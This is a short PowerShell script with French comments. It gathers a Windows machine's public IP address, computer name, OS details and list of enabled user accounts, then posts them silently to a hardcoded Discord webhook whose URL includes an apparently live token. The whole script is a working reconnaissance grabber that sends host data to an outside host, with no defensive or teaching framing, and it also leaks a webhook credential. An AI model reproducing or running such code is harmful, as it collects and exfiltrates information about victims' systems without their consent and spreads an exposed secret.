# Remplacez ceci par l'URL de votre webhook Discord
$webhookUrl = "https://discord.com/api/webhooks/1157740522786533519/GLKqhiaawUlFgVHb_vdIW6tWpOnzRiGdPQqoDbx2gC6-wgbKoiSekkJHhyYLoThWvHQv"

# Fonction pour obtenir l'adresse IP publique
function Get-PublicIPAddress {
    $ipInfo = Invoke-RestMethod -Uri "https://ipinfo.io/json"
    return $ipInfo.ip
}

# Obtenez l'adresse IP publique
$publicIP = Get-PublicIPAddress

# Obtenez le nom de l'ordinateur
$computerName = $env:COMPUTERNAME

# Obtenez des informations sur le système Windows
$osInfo = Get-CimInstance Win32_OperatingSystem

# Obtenez la liste des utilisateurs
$users = Get-WmiObject -Class Win32_UserAccount | Where-Object { $_.Disabled -eq $false } | Select-Object -ExpandProperty Name


# Créez le message à envoyer sur Discord
$message = @{
   content = "L'adresse IP publique actuelle est : $publicIP
   Nom de l'ordinateur : $computerName

Informations sur le système Windows :
- Nom du système d'exploitation : $($osInfo.Caption)
- Version du système d'exploitation : $($osInfo.Version)
- Architecture du système : $($osInfo.OSArchitecture)

Liste des utilisateurs :
$($users -Join "`r`n")
   "
}


# Convertissez le message en JSON
$jsonMessage = $message | ConvertTo-Json

# Envoyez le message au webhook Discord
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonMessage -ContentType "application/json"